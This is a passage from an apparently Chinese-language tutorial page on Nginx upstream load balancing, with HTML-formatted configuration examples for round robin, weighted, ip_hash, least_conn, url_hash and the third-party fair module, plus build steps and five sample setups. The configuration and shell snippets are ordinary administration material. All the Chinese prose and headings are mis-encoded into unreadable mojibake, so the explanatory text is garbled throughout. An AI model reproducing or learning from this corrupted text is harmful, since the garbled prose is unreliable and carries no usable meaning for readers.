·çš„è´Ÿè½½ç®—æ³•?</p><p>Nginxçš„upstreamæ”¯æŒå¦‚ä¸‹å…­ç§æ–¹å¼çš„åˆ†é…ç®—æ³•ï¼Œåˆ†åˆ«æ˜¯:</p><table><thead><tr><th>ç®—æ³•åç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>è½®è¯¢</td><td>é»˜è®¤æ–¹å¼</td></tr><tr><td>weight</td><td>æƒé‡æ–¹å¼</td></tr><tr><td>ip_hash</td><td>ä¾æ®ipåˆ†é…æ–¹å¼</td></tr><tr><td>least_conn</td><td>ä¾æ®æœ€å°‘è¿æ¥æ–¹å¼</td></tr><tr><td>url_hash</td><td>ä¾æ®URLåˆ†é…æ–¹å¼</td></tr><tr><td>fair</td><td>ä¾æ®å“åº”æ—¶é—´æ–¹å¼</td></tr></tbody></table><h5 id="è½®è¯¢"><a class="markdownIt-Anchor" href="#è½®è¯¢"></a> è½®è¯¢</h5><p>æ˜¯upstreamæ¨¡å—è´Ÿè½½å‡è¡¡é»˜è®¤çš„ç­–ç•¥ã€‚æ¯ä¸ªè¯·æ±‚ä¼šæŒ‰æ—¶é—´é¡ºåºé€ä¸ªåˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚è½®è¯¢ä¸éœ€è¦é¢å¤–çš„é…ç½®ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">1</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="weightåŠ æƒåŠ æƒè½®è¯¢"><a class="markdownIt-Anchor" href="#weightåŠ æƒåŠ æƒè½®è¯¢"></a> weightåŠ æƒ[åŠ æƒè½®è¯¢]</h5><p>weight=number:ç”¨æ¥è®¾ç½®æœåŠ¡å™¨çš„æƒé‡ï¼Œé»˜è®¤ä¸º1ï¼Œæƒé‡æ•°æ®è¶Šå¤§ï¼Œè¢«åˆ†é…åˆ°è¯·æ±‚çš„å‡ ç‡è¶Šå¤§ï¼›è¯¥æƒé‡å€¼ï¼Œä¸»è¦æ˜¯é’ˆå¯¹å®é™…å·¥ä½œç¯å¢ƒä¸­ä¸åŒçš„åç«¯æœåŠ¡å™¨ç¡¬ä»¶é…ç½®è¿›è¡Œè°ƒæ•´çš„ï¼Œæ‰€æœ‰æ­¤ç­–ç•¥æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨çš„ç¡¬ä»¶é…ç½®å·®åˆ«æ¯”è¾ƒå¤§çš„æƒ…å†µã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">10</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> weight=<span class="hljs-number">5</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ip_hash"><a class="markdownIt-Anchor" href="#ip_hash"></a> ip_hash</h5><p>å½“å¯¹åç«¯çš„å¤šå°åŠ¨æ€åº”ç”¨æœåŠ¡å™¨åšè´Ÿè½½å‡è¡¡æ—¶ï¼Œip_hashæŒ‡ä»¤èƒ½å¤Ÿå°†æŸä¸ªå®¢æˆ·ç«¯IPçš„è¯·æ±‚é€šè¿‡å“ˆå¸Œç®—æ³•å®šä½åˆ°åŒä¸€å°åç«¯æœåŠ¡å™¨ä¸Šã€‚è¿™æ ·ï¼Œå½“æ¥è‡ªæŸä¸€ä¸ªIPçš„ç”¨æˆ·åœ¨åç«¯WebæœåŠ¡å™¨Aä¸Šç™»å½•åï¼Œåœ¨è®¿é—®è¯¥ç«™ç‚¹çš„å…¶ä»–URLï¼Œèƒ½ä¿è¯å…¶è®¿é—®çš„è¿˜æ˜¯åç«¯webæœåŠ¡å™¨Aã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>ip_hash;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>upstream</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>ip_hash;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦é¢å¤–å¤šè¯´ä¸€ç‚¹çš„æ˜¯ä½¿ç”¨ip_hashæŒ‡ä»¤æ— æ³•ä¿è¯åç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ï¼Œå¯èƒ½å¯¼è‡´æœ‰äº›åç«¯æœåŠ¡å™¨æ¥æ”¶åˆ°çš„è¯·æ±‚å¤šï¼Œæœ‰äº›åç«¯æœåŠ¡å™¨æ¥æ”¶çš„è¯·æ±‚å°‘ï¼Œè€Œä¸”è®¾ç½®åç«¯æœåŠ¡å™¨æƒé‡ç­‰æ–¹æ³•å°†ä¸èµ·ä½œç”¨ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591706748677.png" alt="1591706748677" /></p><h5 id="least_conn"><a class="markdownIt-Anchor" href="#least_conn"></a> least_conn</h5><p>æœ€å°‘è¿æ¥ï¼ŒæŠŠè¯·æ±‚è½¬å‘ç»™è¿æ¥æ•°è¾ƒå°‘çš„åç«¯æœåŠ¡å™¨ã€‚è½®è¯¢ç®—æ³•æ˜¯æŠŠè¯·æ±‚å¹³å‡çš„è½¬å‘ç»™å„ä¸ªåç«¯ï¼Œä½¿å®ƒä»¬çš„è´Ÿè½½å¤§è‡´ç›¸åŒï¼›ä½†æ˜¯ï¼Œæœ‰äº›è¯·æ±‚å ç”¨çš„æ—¶é—´å¾ˆé•¿ï¼Œä¼šå¯¼è‡´å…¶æ‰€åœ¨çš„åç«¯è´Ÿè½½è¾ƒé«˜ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œleast_connè¿™ç§æ–¹å¼å°±å¯ä»¥è¾¾åˆ°æ›´å¥½çš„è´Ÿè½½å‡è¡¡æ•ˆæœã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>least_conn;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤è´Ÿè½½å‡è¡¡ç­–ç•¥é€‚åˆè¯·æ±‚å¤„ç†æ—¶é—´é•¿çŸ­ä¸ä¸€é€ æˆæœåŠ¡å™¨è¿‡è½½çš„æƒ…å†µã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591809623736.png" alt="1591809623736" /></p><h5 id="url_hash"><a class="markdownIt-Anchor" href="#url_hash"></a> url_hash</h5><p>æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œè¦é…åˆç¼“å­˜å‘½ä¸­æ¥ä½¿ç”¨ã€‚åŒä¸€ä¸ªèµ„æºå¤šæ¬¡è¯·æ±‚ï¼Œå¯èƒ½ä¼šåˆ°è¾¾ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œå¯¼è‡´ä¸å¿…è¦çš„å¤šæ¬¡ä¸‹è½½ï¼Œç¼“å­˜å‘½ä¸­ç‡ä¸é«˜ï¼Œä»¥åŠä¸€äº›èµ„æºæ—¶é—´çš„æµªè´¹ã€‚è€Œä½¿ç”¨url_hashï¼Œå¯ä»¥ä½¿å¾—åŒä¸€ä¸ªurlï¼ˆä¹Ÿå°±æ˜¯åŒä¸€ä¸ªèµ„æºè¯·æ±‚ï¼‰ä¼šåˆ°è¾¾åŒä¸€å°æœåŠ¡å™¨ï¼Œä¸€æ—¦ç¼“å­˜ä½äº†èµ„æºï¼Œå†æ­¤æ”¶åˆ°è¯·æ±‚ï¼Œå°±å¯ä»¥ä»ç¼“å­˜ä¸­è¯»å–ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">hash</span> &amp;request_uri;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å¦‚ä¸‹åœ°å€ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/a<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/b<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8083</span>/c<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591812222306.png" alt="1591812222306" /></p><h5 id="fair"><a class="markdownIt-Anchor" href="#fair"></a> fair</h5><p>fairé‡‡ç”¨çš„ä¸æ˜¯å†…å»ºè´Ÿè½½å‡è¡¡ä½¿ç”¨çš„è½®æ¢çš„å‡è¡¡ç®—æ³•ï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®é¡µé¢å¤§å°ã€åŠ è½½æ—¶é—´é•¿çŸ­æ™ºèƒ½çš„è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—çš„fairè´Ÿè½½å‡è¡¡ç­–ç•¥ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">upstream backend&#123;<br>fair;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9001</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9002</span>;<br><span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.23</span><span class="hljs-number">.132</span>:<span class="hljs-number">9003</span>;<br>&#125;<br><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">8083</span>;<br>server_name localhost;<br><span class="hljs-keyword">location</span> /&#123;<br>proxy_pass http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚ä½•ç›´æ¥ä½¿ç”¨ä¼šæŠ¥é”™ï¼Œå› ä¸ºfairå±äºç¬¬ä¸‰æ–¹æ¨¡å—å®ç°çš„è´Ÿè½½å‡è¡¡ã€‚éœ€è¦æ·»åŠ <code>nginx-upstream-fair</code>,å¦‚ä½•æ·»åŠ å¯¹åº”çš„æ¨¡å—:</p><ol><li>ä¸‹è½½nginx-upstream-fairæ¨¡å—</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€ä¸º:<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gnosek/</span>nginx-upstream-fair<br></code></pre></td></tr></table></figure><ol start="2"><li>å°†ä¸‹è½½çš„æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨å¹¶è¿›è¡Œè§£å‹ç¼©</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">unzip nginx-upstream-fair-<span class="hljs-literal">master</span>.zip<br></code></pre></td></tr></table></figure><ol start="3"><li>é‡å‘½åèµ„æº</li></ol><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">mv nginx-upstream-fair-<span class="hljs-keyword">master</span> <span class="hljs-title">fair</span><br></code></pre></td></tr></table></figure><ol start="4"><li>ä½¿ç”¨./configureå‘½ä»¤å°†èµ„æºæ·»åŠ åˆ°Nginxæ¨¡å—ä¸­</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">./configure --add-<span class="hljs-variable language_">module</span>=<span class="hljs-regexp">/root/</span>fair<br></code></pre></td></tr></table></figure><ol start="5"><li>ç¼–è¯‘</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œngx_http_upstream_srv_conf_tç»“æ„ä¸­ç¼ºå°‘default_port</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584941470457.png" alt="1584941470457" /></p><p>è§£å†³æ–¹æ¡ˆ:</p><p>åœ¨Nginxçš„æºç ä¸­ src/http/ngx_http_upstream.h,æ‰¾åˆ°<code>ngx_http_upstream_srv_conf_s</code>ï¼Œåœ¨æ¨¡å—ä¸­æ·»åŠ æ·»åŠ default_portå±æ€§</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">in_port_t</span>   default_<span class="hljs-keyword">port</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584943399597.png" alt="1584943399597" /></p><p>ç„¶åå†è¿›è¡Œmake.</p><ol start="6"><li>æ›´æ–°Nginx</li></ol><p>â€‹ 6.1 å°†sbinç›®å½•ä¸‹çš„nginxè¿›è¡Œå¤‡ä»½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/sbin/</span>nginxold<br></code></pre></td></tr></table></figure><p>â€‹6.2 å°†å®‰è£…ç›®å½•ä¸‹çš„objsä¸­çš„nginxæ‹·è´åˆ°sbinç›®å½•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd objs<br>cp nginx <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br></code></pre></td></tr></table></figure><p>â€‹ 6.3 æ›´æ–°Nginx</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">cd</span></span> ../<br>make upgrade<br></code></pre></td></tr></table></figure><ol start="7"><li>ç¼–è¯‘æµ‹è¯•ä½¿ç”¨Nginx</li></ol><p>ä¸Šé¢ä»‹ç»äº†Nginxå¸¸ç”¨çš„è´Ÿè½½å‡è¡¡çš„ç­–ç•¥ï¼Œæœ‰äººè¯´æ˜¯5ç§ï¼Œæ˜¯æŠŠè½®è¯¢å’ŒåŠ æƒè½®è¯¢å½’ä¸ºä¸€ç§ï¼Œä¹Ÿæœ‰äººè¯´æ˜¯6ç§ã€‚é‚£ä¹ˆåœ¨å’±ä»¬ä»¥åçš„å¼€å‘ä¸­åˆ°åº•ä½¿ç”¨å“ªç§ï¼Œè¿™ä¸ªéœ€è¦æ ¹æ®å®é™…é¡¹ç›®çš„åº”ç”¨åœºæ™¯æ¥å†³å®šçš„ã€‚</p><h4 id="è´Ÿè½½å‡è¡¡æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡æ¡ˆä¾‹"></a> è´Ÿè½½å‡è¡¡æ¡ˆä¾‹</h4><h5 id="æ¡ˆä¾‹ä¸€å¯¹æ‰€æœ‰è¯·æ±‚å®ç°ä¸€èˆ¬è½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹ä¸€å¯¹æ‰€æœ‰è¯·æ±‚å®ç°ä¸€èˆ¬è½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡"></a> æ¡ˆä¾‹ä¸€ï¼šå¯¹æ‰€æœ‰è¯·æ±‚å®ç°ä¸€èˆ¬è½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="æ¡ˆä¾‹äºŒå¯¹æ‰€æœ‰è¯·æ±‚å®ç°åŠ æƒè½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹äºŒå¯¹æ‰€æœ‰è¯·æ±‚å®ç°åŠ æƒè½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡"></a> æ¡ˆä¾‹äºŒï¼šå¯¹æ‰€æœ‰è¯·æ±‚å®ç°åŠ æƒè½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span> weight=<span class="hljs-number">7</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span> weight=<span class="hljs-number">5</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span> weight=<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="æ¡ˆä¾‹ä¸‰å¯¹ç‰¹å®šèµ„æºå®ç°è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹ä¸‰å¯¹ç‰¹å®šèµ„æºå®ç°è´Ÿè½½å‡è¡¡"></a> æ¡ˆä¾‹ä¸‰ï¼šå¯¹ç‰¹å®šèµ„æºå®ç°è´Ÿè½½å‡è¡¡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> videobackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br>&#125;<br><span class="hljs-section">upstream</span> filebackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9004</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8084</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /video/ &#123;<br><span class="hljs-attribute">proxy_pass</span> http://videobackend;<br>&#125;<br><span class="hljs-section">location</span> /file/ &#123;<br><span class="hljs-attribute">proxy_pass</span> http://filebackend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="æ¡ˆä¾‹å››å¯¹ä¸åŒåŸŸåå®ç°è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹å››å¯¹ä¸åŒåŸŸåå®ç°è´Ÿè½½å‡è¡¡"></a> æ¡ˆä¾‹å››ï¼šå¯¹ä¸åŒåŸŸåå®ç°è´Ÿè½½å‡è¡¡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> itcastbackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br>&#125;<br><span class="hljs-section">upstream</span> itheimabackend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9004</span>;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8085</span>;<br><span class="hljs-attribute">server_name</span> www.itcast.cn;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://itcastbackend;<br>&#125;<br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8086</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.cn;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://itheimabackend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="æ¡ˆä¾‹äº”å®ç°å¸¦æœ‰urlé‡å†™çš„è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹äº”å®ç°å¸¦æœ‰urlé‡å†™çš„è´Ÿè½½å‡è¡¡"></a> æ¡ˆä¾‹äº”ï¼šå®ç°å¸¦æœ‰URLé‡å†™çš„è´Ÿè½½å‡è¡¡</h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> backend&#123;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9001</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9002</span>;<br><span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:9003</span>; <br>&#125;<br><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /file/ &#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(/file/.*)</span> /server/<span class="hljs-variable">$1</span> <span class="hljs-literal">last</span>;<br>&#125;<br><span class="hljs-section">location</span> / &#123;<br><span class="hljs-attribute">proxy_pass</span> http://backend;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="nginxå››å±‚è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" 